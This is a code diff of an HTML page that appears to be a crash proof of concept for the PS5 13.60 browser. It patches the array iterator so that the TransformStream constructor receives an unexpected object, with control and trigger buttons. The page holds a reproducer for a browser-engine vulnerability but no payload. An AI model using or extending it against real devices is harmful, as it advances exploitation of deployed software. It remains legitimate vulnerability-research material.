@@ -1,220 +1,91 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>PS5 13.60 - V35.5 A/B TransformStream PoC</title>
+<title>PS5 13.60 TransformStream crash PoC</title>
 
-<style>
-body {
-    background:#111;
-    color:#eee;
-    font:17px monospace;
-    padding:20px;
-}
-button,select {
-    font:17px monospace;
-    padding:10px;
-    margin:5px;
-}
-#status {
-    border:1px solid #555;
-    padding:10px;
-    margin-top:15px;
-}
-pre {
-    white-space:pre-wrap;
-}
-</style>
-
-<h2>PS5 13.60 — V35.5</h2>
-<p>Minimal TransformStream A/B crash reproducer</p>
-
-<select id="mode">
-    <option value="control">A — CONTROL</option>
-    <option value="substitute">B — {} SUBSTITUTION</option>
-</select>
-
-<button id="run">RUN ONCE</button>
-
-<div id="status">READY</div>
-<pre id="out"></pre>
+<pre id="status">READY</pre>
+<button onclick="control()">CONTROL</button>
+<button onclick="trigger()">TRIGGER</button>
 
 <script>
-"use strict";
+const original = Array.prototype[Symbol.iterator];
 
-const originalIterator =
-    Array.prototype[Symbol.iterator];
+function install(substitute) {
+    let call = 0;
 
-const out =
-    document.querySelector("#out");
+    Array.prototype[Symbol.iterator] = function () {
+        const array = this;
+        const id = ++call;
+        const length = array.length;
+        let i = 0;
 
-const statusBox =
-    document.querySelector("#status");
+        return {
+            next() {
+                if (i >= array.length)
+                    return { done: true };
 
-const runButton =
-    document.querySelector("#run");
+                let value = array[i];
 
-function log(s) {
-    out.textContent += s + "\n";
-}
-
-function restore() {
-    Array.prototype[Symbol.iterator] =
-        originalIterator;
-}
-
-function run() {
-
-    runButton.disabled = true;
-
-    const mode =
-        document.querySelector("#mode").value;
-
-    out.textContent = "";
-
-    log("V35.5");
-    log("MODE: " + mode);
-    log("");
-
-    statusBox.textContent =
-        "RUNNING";
-
-    let iteratorNumber = 0;
-    let substitutionCount = 0;
-
-    /*
-     * V35.3 established:
-     *
-     * iterator #1 -> length 2
-     * iterator #2 -> length 3
-     *
-     * The only A/B difference below is whether
-     * iterator #2, index 1 is replaced with {}.
-     */
-
-    Array.prototype[Symbol.iterator] =
-        function() {
-
-            const array = this;
-
-            const id =
-                ++iteratorNumber;
-
-            const initialLength =
-                array.length;
-
-            let index = 0;
-
-            return {
-                next() {
-
-                    if (
-                        index >=
-                        array.length
-                    ) {
-                        return {
-                            done:true
-                        };
-                    }
-
-                    let value =
-                        array[index];
-
-                    if (
-                        mode === "substitute" &&
-                        id === 2 &&
-                        initialLength === 3 &&
-                        index === 1
-                    ) {
-                        value = {};
-                        substitutionCount++;
-                    }
-
-                    index++;
-
-                    return {
-                        done:false,
-                        value:value
-                    };
+                // PS5 13.60:
+                // second iterator call has length 3.
+                if (
+                    substitute &&
+                    id === 2 &&
+                    length === 3 &&
+                    i === 1
+                ) {
+                    value = {};
                 }
-            };
-        };
 
-    let stream;
-    let error = null;
+                i++;
+
+                return {
+                    done: false,
+                    value
+                };
+            }
+        };
+    };
+}
+
+function control() {
+    document.querySelector("#status").textContent =
+        "CONTROL RUNNING";
+
+    install(false);
 
     try {
+        new TransformStream();
 
-        stream =
-            new TransformStream();
+        Array.prototype[Symbol.iterator] = original;
 
-    } catch(e) {
+        document.querySelector("#status").textContent =
+            "CONTROL: CONSTRUCTOR RETURNED";
+    } catch (e) {
+        Array.prototype[Symbol.iterator] = original;
 
-        error = {
-            name:String(e.name),
-            message:String(e.message)
-        };
+        document.querySelector("#status").textContent =
+            "CONTROL EXCEPTION: " + e;
     }
-
-    /*
-     * Restore immediately if constructor returns
-     * or throws normally.
-     */
-
-    restore();
-
-    log(
-        "iterator calls: " +
-        iteratorNumber
-    );
-
-    log(
-        "substitutions: " +
-        substitutionCount
-    );
-
-    if (error) {
-
-        log(
-            "exception: " +
-            error.name +
-            ": " +
-            error.message
-        );
-
-        statusBox.textContent =
-            "NORMAL JS EXCEPTION";
-
-    } else {
-
-        log(
-            "constructor returned"
-        );
-
-        log(
-            "readable: " +
-            typeof stream.readable
-        );
-
-        log(
-            "writable: " +
-            typeof stream.writable
-        );
-
-        statusBox.textContent =
-            "COMPLETED";
-    }
-
-    runButton.disabled = false;
 }
 
-runButton.onclick = run;
+function trigger() {
+    document.querySelector("#status").textContent =
+        "TRIGGER RUNNING";
 
-window.addEventListener(
-    "pagehide",
-    restore
-);
+    install(true);
 
-window.addEventListener(
-    "beforeunload",
-    restore
-);
+    try {
+        new TransformStream();
+
+        Array.prototype[Symbol.iterator] = original;
+
+        document.querySelector("#status").textContent =
+            "TRIGGER: CONSTRUCTOR RETURNED";
+    } catch (e) {
+        Array.prototype[Symbol.iterator] = original;
+
+        document.querySelector("#status").textContent =
+            "TRIGGER EXCEPTION: " + e;
+    }
+}
 </script>
